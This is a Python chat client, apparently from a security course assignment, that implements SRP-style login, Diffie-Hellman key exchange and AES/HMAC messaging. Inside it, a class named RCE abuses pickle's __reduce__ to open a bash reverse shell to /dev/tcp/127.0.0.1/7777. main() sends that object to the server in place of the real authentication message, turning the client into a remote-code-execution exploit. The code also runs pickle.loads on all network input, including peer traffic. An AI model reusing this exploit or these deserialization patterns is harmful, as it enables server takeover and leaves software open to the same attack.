# Imports
import socket
import pickle
import json
import os, random
import time, datetime
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import getpass
from threading import Thread, Lock
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hmac

# Configuration
CONFIG_FILE = "config.json"
def load_config():
    try:
        with open(CONFIG_FILE) as f:
            return json.load(f)
    except FileNotFoundError:
        print("Config File did not read correctly, using default IP/Port.")
        return {"server_ip": "localhost", "server_port": 9090}

# Crypto Setup: Large safe prime (N) and generator (g). Supposedly agreed upon per user upon registration
# But for now, due to time restrains of the assignment we have to hardcode it.
N_hex = """
AC6BDB41324A9A9BF166DE5E1389582FAF72B6651987EE07
FC3192943DB56050A37329CBB4A099ED8193E0757767A13D
D52312AB4B03310DCD7F48A9DA04FD50E8083969EDB767B0
CF6096C56FAD73E6AEF03ECC8F9FA9AA84F927AE9B055C8B
"""
N = int("".join(N_hex.strip().split()), 16)
g = 2

# SHA-512 hash utility func
def hash_sha512(*args) -> bytes:
    digest = hashes.Hash(hashes.SHA512(), backend=default_backend())
    for arg in args:
        if isinstance(arg, int):
            arg = arg.to_bytes((arg.bit_length() + 7) // 8, 'big')
        elif isinstance(arg, str):
            arg = arg.encode()
        digest.update(arg)
    return digest.finalize()

# Private value generator (think like a, b in DH)
def generate_private():
    return int.from_bytes(os.urandom(32), 'big') % N

# SRP-esk multiplier parameter `k = H(N,g)`
def compute_k():
    return int.from_bytes(hash_sha512(N, g), 'big')
k = compute_k()

# Derive AES and HMAC keys using HKDF from shared secret
def derive_session_key(shared_secret) -> tuple:
    if isinstance(shared_secret, int):
        shared_secret = shared_secret.to_bytes((shared_secret.bit_length() + 7) // 8, 'big')
    
    hkdf = HKDF(
        algorithm=hashes.SHA512(),
        length=64,
        salt=None,
        info=b'session keys',
        backend=default_backend()
    )
    key_material = hkdf.derive(shared_secret)
    return key_material[:32], key_material[32:]

# --- Client Class  ---
class SecureClient:
    # Initialize the client with username and password
    # Generate private key (a) and public key (A)
    # Generate ephemeral Diffie-Hellman parameters and public key
    # Initialize sequence number and lock for thread safety
    # Initialize known users dictionary and random listening port
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.a = generate_private()
        self.A = pow(g, self.a, N)
        self.session_key = None
        self.sequence_num = 0
        self.sequence_lock = Lock()
        self.known_users = {}
        self.listen_port = random.randint(10000, 65535)

    # Generate ephemeral Diffie-Hellman parameters and public key
    def generate_ephemeral_dh_params_and_key(self):
        parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
        self.dh_priv = parameters.generate_private_key()
        self.dh_pub = self.dh_priv.public_key()

        return parameters, self.dh_pub

    # Create a secure DH info packet with AES encryption and HMAC
    # Serialize the parameters and public key, encrypt with AES, and generate HMAC
    # Return the IV, encrypted data, and HMAC
    # This is used to send the DH info to the server
    def make_DH_info (self, params, pub_key):
        # Serialize the parameters and public key
        serialized_params = params.parameter_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.ParameterFormat.PKCS3
        )
        serialized_pub_key = pub_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    
        # Combine the serialized data into a tuple
        data = (serialized_params, serialized_pub_key, self.listen_port)
    
        # Serialize the tuple using pickle
        serialized_data = pickle.dumps(data)
    
        # Derive AES encryption key from the shared secret (self.K)
        aes_key, hmac_key = derive_session_key(self.K)
    
        # Encrypt the serialized data using AES in CBC mode
        iv = os.urandom(16)  # Generate a random initialization vector
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
    
        # Pad the serialized data to match the block size
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(serialized_data) + padder.finalize()
    
        # Encrypt the padded data
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    
        h = hmac.HMAC(hmac_key, hashes.SHA256(), backend=default_backend())
        h.update(iv + encrypted_data)
        mac = h.finalize()

        # Return iv, encrypted_data, and mac
        return iv, encrypted_data, mac

    # Generate the Diffie-Hellman key using the server's response
    # Verify the server's HMAC, decrypt the server's public key,
    # and compute the shared secret using the client's private key and server's public key
    def generate_dh_key(self, iv, encrypted_response, response_mac):
        try:
            # Derive the initial AES and HMAC keys from self.K
            Kaes_key, Khmac_key = derive_session_key(self.K)

            # Verify the server's HMAC
            h = hmac.HMAC(Khmac_key, hashes.SHA256(), backend=default_backend())
            h.update(iv + encrypted_response)
            h.verify(response_mac)  # This raises an exception if invalid

            # Decrypt the server's DH public key
            cipher = Cipher(algorithms.AES(Kaes_key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            padded_data = decryptor.update(encrypted_response) + decryptor.finalize()

            # Unpad the decrypted data
            unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
            response_data = unpadder.update(padded_data) + unpadder.finalize()

            # Extract the serialized server public key
            serialized_server_pub_key = pickle.loads(response_data)

            # Load the server's public key
            server_pub_key = serialization.load_pem_public_key(serialized_server_pub_key, backend=default_backend())

            # Compute shared secret using the client’s private key and server’s public key
            shared_secret = self.dh_priv.exchange(server_pub_key)

            # Derive final session keys from shared secret
            aes_key, hmac_key = derive_session_key(shared_secret)

            # Save the session keys
            self.session_keys = (aes_key, hmac_key)

        except Exception as e:
            print(f"Error generating DH key: {e}")
            raise

    # Begin login authentication by sending A and username to the server.
    def start_auth(self):
        return self.A, self.username

    # Process server challenge with salt and B, compute shared secret and proof M.
    def process_challenge(self, salt, B):
        if B % N == 0:
            raise ValueError("Invalid B")
        self.salt = salt
        self.B = B
        self.u = int.from_bytes(hash_sha512(self.A, self.B), 'big')
        if self.u == 0:
            raise ValueError("Invalid u")
        x = int.from_bytes(hash_sha512(self.salt, self.password), 'big')
        S = pow((B - k * pow(g, x, N)) % N, self.a + self.u * x, N)
        self.K = S
        self.session_key = derive_session_key(self.K)
        hash_N = int.from_bytes(hash_sha512(N), 'big')
        hash_g = int.from_bytes(hash_sha512(g), 'big')
        hash_I = int.from_bytes(hash_sha512(self.username), 'big')
        self.M = hash_sha512(hash_N ^ hash_g, hash_I, self.salt, self.A, self.B, self.K)
        return self.M

    # Verify server's proof to ensure mutual authentication
    def verify_server(self, server_HAMK):
        expected = hash_sha512(self.A, self.M, self.K)
        return server_HAMK == expected
    
    # Helper function to encrypt and HMAC given commands
    # Serialize the command, encrypt it using AES, and generate HMAC
    # Return the IV, ciphertext, and HMAC
    # This is used to send commands to the server
    def encrypt_and_hmac_command(self, command, seq):
        aes_key, hmac_key = self.session_keys

        # Serialize the command
        message = pickle.dumps((command, seq))

        # Pad and encrypt
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()
        padded = padder.update(message) + padder.finalize()
        ciphertext = encryptor.update(padded) + encryptor.finalize()

        # HMAC the IV + ciphertext
        h = hmac.HMAC(hmac_key, hashes.SHA256(), backend=default_backend())
        h.update(iv + ciphertext)
        mac = h.finalize()

        return iv, ciphertext, mac

    # Helper function to handle server responses
    # Verify the HMAC, decrypt the response, and process the command
    # Deserialize the response and update the known users or sequence number
    def handle_response(self, command, iv, ciphertext, mac):
        try:
            # Extract session keys
            aes_key, hmac_key = self.session_keys

            # Verify the HMAC
            h = hmac.HMAC(hmac_key, hashes.SHA256(), backend=default_backend())
            h.update(iv + ciphertext)
            h.verify(mac)  # Raises an exception if the HMAC is invalid

            # Decrypt the response
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            padded_data = decryptor.update(ciphertext) + decryptor.finalize()

            # Unpad the decrypted data
            unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
            response_data = unpadder.update(padded_data) + unpadder.finalize()

            # Deserialize the response
            _, message = pickle.loads(response_data)
            
            # The flow is different for message response, mainly because we need to check the timestamp
            # and if the user is in the known_users list
            if command == 'MSG_RESPONSE':
                target_user, target_ip, target_port, aes_key, timestamp = message 

                if target_user in self.known_users:
                    return

                timestamp_datetime = datetime.datetime.fromtimestamp(timestamp)
                # Check if it's older than 5 minutes
                if datetime.datetime.now() - timestamp_datetime > datetime.timedelta(minutes=5):
                    raise ValueError("Message is older than 5 minutes")
                
                self.known_users[target_user] = ((target_ip, target_port), aes_key)   
            else:    
                seq_received, online_users = message
                # Verify the sequence number
                with self.sequence_lock:
                    if seq_received != self.sequence_num:
                        raise ValueError("Invalid sequence number")
                    self.sequence_num = seq_received

            if command == 'LIST':
                # Print the list of online users
                print(f"\nOnline users: {', '.join(online_users)}\nCommand (send/list/quit): ", end='')
            elif command == 'LOGOUT':
                print(f"\nLogout successful.", end='')

        except Exception as e:
            print(f"\nError processing response: {e}\nCommand (send/list/quit): ", end='')

    # Send a direct message to a target user
    # Encrypt the message using AES and HMAC, and send it to the target user
    # The target user must be in the known_users list
    def send_direct_msg(self, target_user, msg):
        try:
            # Encrypt the message
            target_ip, target_port = self.known_users[target_user][0]
            aes_key = self.known_users[target_user][1]

            # Serialize the message
            serialized_msg = pickle.dumps((self.username, msg, time.time()))

            # Pad and encrypt
            iv = os.urandom(16)
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            padder = padding.PKCS7(128).padder()
            padded = padder.update(serialized_msg) + padder.finalize()
            ciphertext = encryptor.update(padded) + encryptor.finalize()

            # HMAC the IV + ciphertext
            h = hmac.HMAC(aes_key, hashes.SHA256(), backend=default_backend())
            h.update(iv + ciphertext)
            mac = h.finalize()

            # Send the encrypted message
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target_ip, target_port))
                s.sendall(pickle.dumps(('MSG', (self.username, iv, ciphertext, mac))))

        except Exception as e:
            print(f"Error sending direct message: {e}")
    
    # Receive a direct message from a target user
    # Verify the HMAC, decrypt the message, and print it
    # The target user must be in the known_users list
    # Check if the message is older than 5 minutes
    def receive_direct_msg(self, username, iv, ciphertext, mac):
        try:
            # Extract session keys
            aes_key = self.known_users[username][1]

            # Verify the HMAC
            h = hmac.HMAC(aes_key, hashes.SHA256(), backend=default_backend())
            h.update(iv + ciphertext)
            h.verify(mac)  # Raises an exception if the HMAC is invalid

            # Decrypt the response
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            padded_data = decryptor.update(ciphertext) + decryptor.finalize()

            # Unpad the decrypted data
            unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
            response_data = unpadder.update(padded_data) + unpadder.finalize()

            # Deserialize the response
            sender_user, msg, timestamp = pickle.loads(response_data)

            timestamp_datetime = datetime.datetime.fromtimestamp(timestamp)
            # Check if it's older than 5 minutes
            if datetime.datetime.now() - timestamp_datetime > datetime.timedelta(minutes=5):
                raise ValueError("Message is older than 5 minutes")

            print(f"\nMessage from {sender_user}: {msg}\nCommand (send/list/quit): ", end='')

        except Exception as e:
            print(f"\nError processing direct message: {e}\nCommand (send/list/quit): ", end='')

class RCE:
    def __reduce__(self):
        return (
            eval,
            ("__import__('os').system(\"bash -c 'bash -i >& /dev/tcp/127.0.0.1/7777 0>&1'\")",)
        )
    
"""
Main function to run the client. Handles user input, authentication,
message sending and receiving through a persistent connection.
"""
def main():
    config = load_config()
    username = input("Username: ")
    password = getpass.getpass("Password: ")
    
    client = SecureClient(username, password)
    
    # Large body for the main client running code
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((config['server_ip'], config['server_port']))
            
            # Authentication
            s.sendall(pickle.dumps(("AUTH", RCE())))
            # s.sendall(pickle.dumps(('AUTH', client.start_auth())))
            response = pickle.loads(s.recv(4096))
            if isinstance(response, str) and response == "AUTH_FAILED":
                print("Authentication failed: Invalid credentials")
                return
            salt, B = response
            M = client.process_challenge(salt, B)
            s.sendall(pickle.dumps(M))
            
            server_HAMK = pickle.loads(s.recv(4096))
            if client.verify_server(server_HAMK):
                print("Authentication in progress.")

                # Generate Client-Server Key using Diffie-Hellman then deriving AES and HMAC keys

                # Send the server the ephemeral DH parameters and public key
                parameters, public_key = client.generate_ephemeral_dh_params_and_key()
                iv, packet, mac = client.make_DH_info(parameters, public_key)
                s.sendall(pickle.dumps((iv, packet, mac)))

                # Receive the server's response
                iv, response, response_mac = pickle.loads(s.recv(4096))
                client.generate_dh_key(iv, response, response_mac)

                print("Authentication successful.")

                # Start listener thread
                def message_listener():
                    while True:
                        try:
                            data = s.recv(4096)
                            if not data:
                                break
                                
                            try:
                                response = pickle.loads(data)
                                if isinstance(response, tuple) and len(response) == 2:
                                    command, payload = response
                                    # list response command, uses helper to process
                                    if command == 'LIST_RESPONSE':
                                        try:
                                            iv, ciphertext, mac = payload
                                            client.handle_response("LIST", iv, ciphertext, mac)
                                        except Exception as e:
                                            print(f"\nSecurity alert during LIST_RESPONSE: {e}\nCommand (send/list/quit): ", end='')
                                    # logout response command, uses helper to process
                                    elif command == 'LOGOUT_SUCCESS':
                                        try:
                                            iv, ciphertext, mac = payload
                                            client.handle_response("LOGOUT", iv, ciphertext, mac)
                                        except Exception as e:
                                            print(f"\nSecurity alert during LOGOUT_RESPONSE: {e}\nCommand (send/list/quit): ", end='')
                                    # message response command, uses helper to process
                                    elif command == 'MSG_RESPONSE':
                                        try:
                                            iv, ciphertext, mac = payload
                                            client.handle_response("MSG_RESPONSE", iv, ciphertext, mac)
                                        except Exception as e:
                                            print(f"\nSecurity alert during MSG_RESPONSE: {e}\nCommand (send/list/quit): ", end='')
                                    # message command, uses specialized helper to process
                                    elif command == 'MSG':
                                        try:
                                            username, iv, ciphertext, mac = payload
                                            client.receive_direct_msg(username, iv, ciphertext, mac)
                                        except Exception as e:
                                            print(f"\nSecurity alert during MSG: {e}\nCommand (send/list/quit): ", end='')
                            # Various error control mechanisms, if given the time I would make this section less clunky - I feel extra lines get printed at times
                            except pickle.UnpicklingError:
                                print(f"\nServer: {data.decode()}\nCommand (send/list/quit): ", end='')
                            except Exception as e:
                                print(f"\nError processing message: {e}\nCommand (send/list/quit): ", end='')
                        except socket.timeout:
                            continue
                        except Exception as e:
                            print(f"\nConnection error: {e}")
                            break
                
                # Thread to handle incoming peer connections - this is used for the direct messaging
                def handle_peer_connection(conn, addr):
                    try:
                        data = conn.recv(4096)
                        if not data:
                            return
                        try:
                            response = pickle.loads(data)
                            command, payload = response
                            username, iv, ciphertext, mac = payload
                            client.receive_direct_msg(username, iv, ciphertext, mac)
                        except Exception as e:
                            print(f"[!] Failed to process peer message from {addr}: {e}")
                    finally:
                        conn.close()

                # Thread to listen for incoming peer connections
                # This is used for the direct messaging
                # The client will listen on a random port for incoming connections on all interfaces
                def peer_listener():
                    peer_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    peer_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    peer_sock.bind(('0.0.0.0', client.listen_port))  # Listen on all interfaces
                    peer_sock.listen(5)

                    while True:
                        conn, addr = peer_sock.accept()
                        Thread(target=handle_peer_connection, args=(conn, addr), daemon=True).start()



                listener_thread = Thread(target=message_listener, daemon=True)
                listener_thread.start()
                peer_thread = Thread(target=peer_listener, daemon=True)
                peer_thread.start()

                # CLI for commands
                while True:
                    try:
                        command = input("Command (send/list/quit): ").strip()
                        
                        # process the quit command
                        if command == 'quit':
                            try:
                                with client.sequence_lock:
                                    client.sequence_num += 1
                                    current_seq = client.sequence_num

                                iv, ciphertext, mac = client.encrypt_and_hmac_command("LOGOUT", current_seq)
                                s.sendall(pickle.dumps(('LOGOUT', (iv, ciphertext, mac))))

                            except Exception as e:
                                print(f"Error logging out: {e}")

                            print("Logging out.")
                            break
                            
                        # process the list command, this will send a request to the server asking for a list of all active users
                        elif command == 'list':
                            try:
                                with client.sequence_lock:
                                    client.sequence_num += 1
                                    current_seq = client.sequence_num

                                iv, ciphertext, mac = client.encrypt_and_hmac_command("LIST", current_seq)
                                s.sendall(pickle.dumps(('LIST', (iv, ciphertext, mac))))

                            except Exception as e:
                                print(f"Error requesting list: {e}")

                        # process the send command, this will send a message to the server which asks for the users information if we do not have it
                        # If we do have it, we will send the message directly to the user
                        # If the user is not in the known_users list, we will ask the server for the users information then send it
                        elif command.startswith('send'):
                                try:
                                    parts = command.split(maxsplit=2)
                                    if len(parts) < 3:
                                        print("Usage: send <user> <message>")
                                        continue
                                    target_user, msg = parts[1], parts[2]

                                    if target_user == client.username:
                                        print("Cannot send message to yourself.")
                                        continue
                                    elif target_user in client.known_users:
                                        client.send_direct_msg(target_user, msg)
                                    else:
                                        with client.sequence_lock:
                                            client.sequence_num += 1
                                            current_seq = client.sequence_num

                                        iv, ciphertext, mac = client.encrypt_and_hmac_command('MSG_REQUEST', (target_user, current_seq))
                                        s.sendall(pickle.dumps(('MSG_REQUEST', (iv, ciphertext, mac))))
                                        time.sleep(3)
                                        client.send_direct_msg(target_user, msg)

                                except Exception as e:
                                    print(f"Error sending message: {e}")
                        else:
                            print("Unknown command")
                    # Handle keyboard interrupt the same as the quit command to allow graceful exit
                    except KeyboardInterrupt:
                        try:
                            with client.sequence_lock:
                                client.sequence_num += 1
                                current_seq = client.sequence_num

                            iv, ciphertext, mac = client.encrypt_and_hmac_command("LOGOUT", current_seq)
                            s.sendall(pickle.dumps(('LOGOUT', (iv, ciphertext, mac))))

                        except Exception as e:
                            print(f"Error logging out: {e}")

                        print("Logging out.")
                        break
                    except Exception as e:
                        print(f"Error: {e}")
                        
                listener_thread.join(timeout=1)
            else:
                print("Authentication failed.")
                
    except Exception as e:
        print(f"Connection error: {e}")

if __name__ == "__main__":
    main()